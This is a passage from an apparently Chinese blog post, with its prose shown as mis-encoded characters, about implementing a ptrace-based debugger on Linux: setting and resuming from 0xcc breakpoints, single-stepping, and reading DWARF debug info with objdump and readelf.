class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">objdump -d victim</span>      </span><br><span class=\"line\"></span><br><span class=\"line\">victim:     file format elf64-x86-64</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\">0000000000401000 &lt;_start&gt;:</span><br><span class=\"line\">  401000:       48 c7 c7 01 00 00 00    mov    $0x1,%rdi</span><br><span class=\"line\">  401007:       48 8d 35 f2 0f 00 00    lea    0xff2(%rip),%rsi        # 402000 &lt;.msg&gt;</span><br><span class=\"line\">  40100e:       48 c7 c2 14 00 00 00    mov    $0x14,%rdx</span><br><span class=\"line\">  401015:       48 c7 c0 01 00 00 00    mov    $0x1,%rax</span><br><span class=\"line\">  40101c:       0f 05                   syscall </span><br><span class=\"line\">  40101e:       48 c7 c0 3c 00 00 00    mov    $0x3c,%rax</span><br><span class=\"line\">  401025:       0f 05                   syscall </span><br></pre></td></tr></table></figure>\n<p>è·å–ç¬¬ä¸€æ¡æŒ‡ä»¤åœ°å€ <code>401000</code></p>\n<p>åœ¨è¿™æ¡åœ°å€ä¸Šå–å‡ºæŒ‡ä»¤ è®¾ç½®ä¸º 0xcc ç„¶åå†™å›</p>\n<ul>\n<li>PTRACE_CONT  : Restart  the stopped tracee process.</li>\n<li>PTRACE_POKETEXT, PTRACE_POKEDATA è¿™ä¸¤ä¸ªæ˜¯ equivalent çš„</li>\n<li>strsignal ä¸€å®šè¦åŒ…å«å¤´æ–‡ä»¶ string.h å¦åˆ™ä¼šå¼•ç”¨åˆ°å†…æ ¸å¤´æ–‡ä»¶ä¸­å»ã€‚</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Ptrace(PTRACE_GETREGS, child_pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\"><span class=\"type\">unsigned</span> instr = Ptrace(PTRACE_PEEKTEXT, child_pid,(<span class=\"type\">void</span> *)addr,(<span class=\"type\">void</span> *)<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* modify instruction in addr 0x401000 to 0xcc */</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> trap_instr = (instr &amp; <span class=\"number\">0xffffff00</span>) | <span class=\"number\">0xcc</span>;</span><br><span class=\"line\">Ptrace(PTRACE_POKETEXT, child_pid, (<span class=\"type\">void</span> *)addr, trap_instr);</span><br><span class=\"line\"><span class=\"type\">unsigned</span> readback = Ptrace(PTRACE_PEEKTEXT, child_pid,(<span class=\"type\">void</span> *)addr,(<span class=\"type\">void</span> *)<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">pntmsg(<span class=\"string\">&quot;instruction 0x%08x in addr 0x%08x\\n&quot;</span>, readback, addr);</span><br><span class=\"line\"><span class=\"comment\">// pause();</span></span><br><span class=\"line\"></span><br><span class=\"line\">Ptrace(PTRACE_CONT, child_pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">wait(&amp;wait_status);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class=\"line\">    pntmsg(<span class=\"string\">&quot;Child got a signal: %s\\n&quot;</span>, strsignal(WSTOPSIG(wait_status)));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;wait&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* See where the child is now */</span></span><br><span class=\"line\">Ptrace(PTRACE_GETREGS, child_pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\">pntmsg(<span class=\"string\">&quot;Child stopped at RIP = 0x%08x\\n&quot;</span>, regs.rip);</span><br><span class=\"line\">pause();</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[PNT] debugger started</span><br><span class=\"line\">[CHD] target started. will run &#x27;./victim&#x27;</span><br><span class=\"line\">[PNT] instruction 0x01c7c7cc in addr 0x00401000</span><br><span class=\"line\">[PNT] Child got a signal: Trace/breakpoint trap</span><br><span class=\"line\">[PNT] Child stopped at RIP = 0x00401001</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ° rip ç§»åŠ¨äº†ä¸€ä½ï¼Œéœ€è¦ç§»åŠ¨å›å»ï¼Œç„¶åè¦†å†™è¿™åŸæ¥çš„ä½ç½®ï¼Œå°±èƒ½ç»§ç»­è¿è¡Œäº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">regs.rip -= <span class=\"number\">1</span>;</span><br><span class=\"line\">Ptrace(PTRACE_SETREGS, child_pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\">Ptrace(PTRACE_POKETEXT, child_pid, regs.rip, instr);</span><br><span class=\"line\">pntmsg(<span class=\"string\">&quot;icounter = %u, instr = 0x%08x, rip = 0x%08x\\n&quot;</span>,</span><br><span class=\"line\">    icounter, instr, regs.rip</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">// pause();</span></span><br><span class=\"line\"><span class=\"comment\">/* Make the child execute another instruction */</span></span><br><span class=\"line\">Ptrace(PTRACE_SINGLESTEP, child_pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">pause();</span><br><span class=\"line\"><span class=\"comment\">/* Wait for child to stop on its next instruction */</span></span><br><span class=\"line\">wait(&amp;wait_status);</span><br></pre></td></tr></table></figure>\n<p>å¦å¤– è¿™ä¸ªæå– rip ç„¶ååŠ å‡å†™çš„æ“ä½œå¯ä»¥è¢«å°è£…å¥½</p>\n<ul>\n<li>create_breakpoint</li>\n<li>resume_from_breakpoint<br>\n å¯¹äº ptrace å¾ˆå‘çš„ä¸€ç‚¹åœ¨äºï¼Œæœ‰çš„æ—¶å€™è¿”å›å€¼ä¸ºè´Ÿæ•°ä¸æ­£å¸¸ï¼Œæœ‰çš„æ—¶å€™å´æ­£å¸¸ã€‚éœ€è¦åŒºåˆ«å¯¹å¾…<br>\nç°åœ¨å†™ä¸€ä¸ªæ–°çš„ victim å®ä¾‹</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">do_stuff</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello, &quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; ++i)</span><br><span class=\"line\">        do_stuff();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;world!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// gcc -o victim victim.c -no-pie</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000401156 &lt;do_stuff&gt;:</span><br><span class=\"line\">  401156:       f3 0f 1e fa             endbr64 </span><br><span class=\"line\">  40115a:       55                      push   %rbp</span><br><span class=\"line\">  40115b:       48 89 e5                mov    %rsp,%rbp</span><br><span class=\"line\">  40115e:       48 8d 3d 9f 0e 00 00    lea    0xe9f(%rip),%rdi        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class=\"line\">  401165:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class=\"line\">  40116a:       e8 f1 fe ff ff          callq  401060 &lt;printf@plt&gt;</span><br><span class=\"line\">  40116f:       90                      nop</span><br><span class=\"line\">  401170:       5d                      pop    %rbp</span><br><span class=\"line\">  401171:       c3                      retq</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœè¦å‘½ä¸­ä¸€ä¸ªæ–­ç‚¹å¤šæ¬¡ï¼Œå°±æ˜¯å…ˆæ¸…é™¤è¿™ä¸ªæ–­ç‚¹ï¼Œç„¶åè®©å®ƒå›æ»šï¼Œå†å•æ­¥ï¼Œå†å†™å›è¿™ä¸ªæ–­ç‚¹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    1. get regs</span></span><br><span class=\"line\"><span class=\"comment\">    2. rollback rip and write back</span></span><br><span class=\"line\"><span class=\"comment\">    3. single step</span></span><br><span class=\"line\"><span class=\"comment\">    4. re-enable breakpoint</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">resume_from_breakpoint</span><span class=\"params\">(<span class=\"type\">pid_t</span> pid, debug_breakpoint* dbp)</span>&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_regs_struct</span> <span class=\"title\">regs</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> wait_status;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptrace(PTRACE_GETREGS, pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[DBG] 0x%08x 0x%08x\\n&quot;</span>, dbp-&gt;addr, regs.rip);</span><br><span class=\"line\">    assert(dbp-&gt;addr + <span class=\"number\">1</span> == regs.rip);</span><br><span class=\"line\"></span><br><span class=\"line\">    regs.rip -= <span class=\"number\">1</span>;</span><br><span class=\"line\">    ptrace(PTRACE_SETREGS, pid, <span class=\"number\">0</span>, &amp;regs);</span><br><span class=\"line\">    disable_breakpoint(pid, dbp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[DBG] before single step %p\\n&quot;</span>, get_child_rip(pid));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ptrace(PTRACE_SINGLESTEP, pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;ptrace&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    wait(&amp;wait_status);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[DBG] %s at (%s:%u)\\n&quot;</span>, strsignal(WSTOPSIG(wait_status)), __FILE__, __LINE__);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (WIFEXITED(wait_status)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    enable_breakpoint(pid, dbp);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ptrace(PTRACE_CONT, pid, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;ptrace&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    wait(&amp;wait_status);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(WIFEXITED(wait_status)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    pntmsg(<span class=\"string\">&quot;child stopped at breakpoint. RIP = %p\\n&quot;</span>, get_child_rip(child_pid));</span><br><span class=\"line\">    pntmsg(<span class=\"string\">&quot;resuming\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> rc = resume_from_breakpoint(child_pid, dbp);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rc == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        pntmsg(<span class=\"string\">&quot;child exited\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (rc == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        pntmsg(<span class=\"string\">&quot;unexpected: %d\\n&quot;</span>, rc);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"debug-info\"><a class=\"markdownIt-Anchor\" href=\"#debug-info\">#</a> debug info</h1>\n<p>ELF ä¸­ç”¨çš„ debug ä¿¡æ¯æ ¼å¼æ˜¯ DWARF<br>\n å…¶ä¸­ç±»ä¼¼ <code>DW_TAG_compile_unit</code>  çš„æ˜¯ dwarf çš„ tag<br>\nps: readelf ä¹Ÿèƒ½çœ‹åˆ° <code>readelf --debug-dump ./traceproc2 &gt; readelf</code> <br>\nps: gcc äº§ç”Ÿ dwarf  <code>gcc -gdwarf-4 -no-pie -o traceproc2 traceproc2.c</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">objdump --dwarf=info ./traceproc2</span> </span><br><span class=\"line\"></span><br><span class=\"line\">./traceproc2:     file format elf64-x86-64</span><br><span class=\"line\"></span><br><span class=\"line\">Contents of the .debug_info section:</span><br><span class=\"line\"></span><br><span class=\"line\">  Compilation Unit @ offset 0x0:</span><br><span class=\"line\">   Length:        0x343 (32-bit)</span><br><span class=\"line\">   Version:       4</span><br><span class=\"line\">   Abbrev Offset: 0x0</span><br><span class=\"line\">   Pointer Size:  8</span><br><span class=\"line\"> &lt;0&gt;&lt;b&gt;: Abbrev Number: 1 (DW_TAG_compile_unit)</span><br><span class=\"line\">    &lt;c&gt;   DW_AT_producer    : (indirect string, offset: 0x18): GNU C17 9.4.0 -mtune=generic -march=x86-64 -g -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection</span><br><span class=\"line\">    &lt;10&gt;   DW_AT_language    : 12       (ANSI C99)</span><br><span class=\"line\">    &lt;11&gt;   DW_AT_name        : (indirect string, offset: 0x143): traceproc2.c</span><br><span class=\"line\">    &lt;15&gt;   DW_AT_comp_dir    : (indirect string, offset: 0x1bd): /home/squ/proj/debugger-impl/debugger-impl/subject</span><br><span class=\"line\">    &lt;19&gt;   DW_AT_low_pc      : 0x401136               &lt;-&lt; do_stuff</span><br><span class=\"line\">    &lt;21&gt;   DW_AT_high_pc     : 0x60</span><br><span class=\"line\">    &lt;29&gt;   DW_AT_stmt_list   : 0x0</span><br><span class=\"line\"> &lt;1&gt;&lt;2d&gt;: Abbrev Number: 2 (DW_TAG_typedef)</span><br><span class=\"line\">    &lt;2e&gt;   DW_AT_name        : (indirect string, offset: 0xc5): size_t</span><br><span class=\"line\">    &lt;32&gt;   DW_AT_decl_file   : 2</span><br><span class=\"line\">    &lt;33&gt;   DW_AT_decl_line   : 209</span><br><span class=\"line\">    &lt;34&gt;   DW_AT_decl_column : 23</span><br><span class=\"line\">    &lt;35&gt;   DW_AT_type        : &lt;0x39&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000401136 &lt;do_stuff&gt;:</span><br><span class=\"line\">  401136:       f3 0f 1e fa             endbr64 </span><br><span class=\"line\">  40113a:       55                      push   %rbp</span><br><span class=\"line\">  40113b:       48 89 e5                mov    %rsp,%rbp</span><br><span class=\"line\">  </span><br><span class=\"line\">  (Â·Â·Â·)</span><br><span class=\"line\">  </span><br><span class=\"line\">  40117b:\tc9                   \tleaveq </span><br><span class=\"line\">  40117c:\tc3                   \tretq   </span><br><span class=\"line\"></span><br><span class=\"line\">000000000040117d &lt;main&gt;:</span><br><span class=\"line\">  40117d:       f3 0f 1e fa             endbr64 </span><br><span class=\"line\">  401181:       55                      push   %rbp</span><br><span class=\"line\">  </span><br><span class=\"line\">  (Â·Â·Â·)</span><br><span class=\"line\">  </span><br><span class=\"line\">  401195:       c3                      retq   </span><br><span class=\"line\">  401196:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å†å¾€ä¸‹èƒ½çœ‹åˆ°ä¸¤ä¸ª subprogram tab çš„ï¼Œè®°å½•äº†å‡½æ•°å å‡½æ•°é•¿åº¦ å’Œå‡½æ•°èµ·å§‹åœ°å€</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;1&gt;&lt;2e2&gt;: Abbrev Number: 16 (DW_TAG_subprogram)</span><br><span class=\"line\">   &lt;2e3&gt;   DW_AT_external    : 1</span><br><span class=\"line\">   &lt;2e3&gt;   DW_AT_name        : (indirect string, offset: 0x1f0): main      &lt;&lt;- name</span><br><span class=\"line\">   &lt;2e7&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;2e8&gt;   DW_AT_decl_line   : 14</span><br><span class=\"line\">   &lt;2e9&gt;   DW_AT_decl_column : 5</span><br><span class=\"line\">   &lt;2ea&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class=\"line\">   &lt;2ee&gt;   DW_AT_low_pc      : 0x40117d                                    &lt;&lt;- addr</span><br><span class=\"line\">   &lt;2f6&gt;   DW_AT_high_pc     : 0x19                                        &lt;&lt;- offset of end</span><br><span class=\"line\">   &lt;2fe&gt;   DW_AT_frame_base  : 1 byte block: 9c \t(DW_OP_call_frame_cfa)</span><br><span class=\"line\">   &lt;300&gt;   DW_AT_GNU_all_tail_call_sites: 1</span><br><span class=\"line\">&lt;1&gt;&lt;300&gt;: Abbrev Number: 17 (DW_TAG_subprogram)</span><br><span class=\"line\">   &lt;301&gt;   DW_AT_external    : 1</span><br><span class=\"line\">   &lt;301&gt;   DW_AT_name        : (indirect string, offset: 0x1a1): do_stuff</span><br><span class=\"line\">   &lt;305&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;306&gt;   DW_AT_decl_line   : 4</span><br><span class=\"line\">   &lt;307&gt;   DW_AT_decl_column : 6</span><br><span class=\"line\">   &lt;308&gt;   DW_AT_prototyped  : 1</span><br><span class=\"line\">   &lt;308&gt;   DW_AT_low_pc      : 0x401136</span><br><span class=\"line\">   &lt;310&gt;   DW_AT_high_pc     : 0x47</span><br><span class=\"line\">   &lt;318&gt;   DW_AT_frame_base  : 1 byte block: 9c \t(DW_OP_call_frame_cfa)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>ç¬¬ä¸€ä¸ª <code>&lt;&gt;</code>  ä¸ºåµŒå¥—æ·±åº¦</li>\n<li>å¯¹äºæ ‡è®°äº† DW_TAG_variable tab çš„å˜é‡ã€‚DW_AT_type èƒ½æ ¹æ®ç¬¬äºŒåˆ— <code>&lt; &gt;</code>  é‡Œçš„æ•°å­—æ‰¾åˆ°å¯¹åº”çš„å®šä¹‰ï¼ˆå¤§å°ç±»å‹ï¼‰</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;1&gt;&lt;300&gt;: Abbrev Number: 17 (DW_TAG_subprogram)</span><br><span class=\"line\">   &lt;301&gt;   DW_AT_external    : 1</span><br><span class=\"line\">   &lt;301&gt;   DW_AT_name        : (indirect string, offset: 0x1a1): do_stuff</span><br><span class=\"line\">   &lt;305&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;306&gt;   DW_AT_decl_line   : 4</span><br><span class=\"line\">   &lt;307&gt;   DW_AT_decl_column : 6</span><br><span class=\"line\">   &lt;308&gt;   DW_AT_prototyped  : 1</span><br><span class=\"line\">   &lt;308&gt;   DW_AT_low_pc      : 0x401136</span><br><span class=\"line\">   &lt;310&gt;   DW_AT_high_pc     : 0x47</span><br><span class=\"line\">   &lt;318&gt;   DW_AT_frame_base  : 1 byte block: 9c \t(DW_OP_call_frame_cfa)</span><br><span class=\"line\">   &lt;31a&gt;   DW_AT_GNU_all_tail_call_sites: 1</span><br><span class=\"line\">&lt;2&gt;&lt;31a&gt;: Abbrev Number: 18 (DW_TAG_formal_parameter)</span><br><span class=\"line\">   &lt;31b&gt;   DW_AT_name        : (indirect string, offset: 0x11a): my_arg</span><br><span class=\"line\">   &lt;31f&gt;   DW_AT_decl_file   : 1</span><br><span class=\"line\">   &lt;320&gt;   DW_AT_decl_line   : 4</span><br><span class=\"line\">   &lt;321&gt;   DW_AT_decl_column : 19</span><br><span class=\"line\">   &lt;322&gt;   DW_AT_type        : &lt;0x65&gt;</span><br><span class=\"line\">   &lt;326&gt;   DW_AT_location    : 2 byte block: 91 5c \t(DW_OP_fbreg: -36)</span><br><span class=\"line\">&lt;2&gt;&lt;329&gt;: 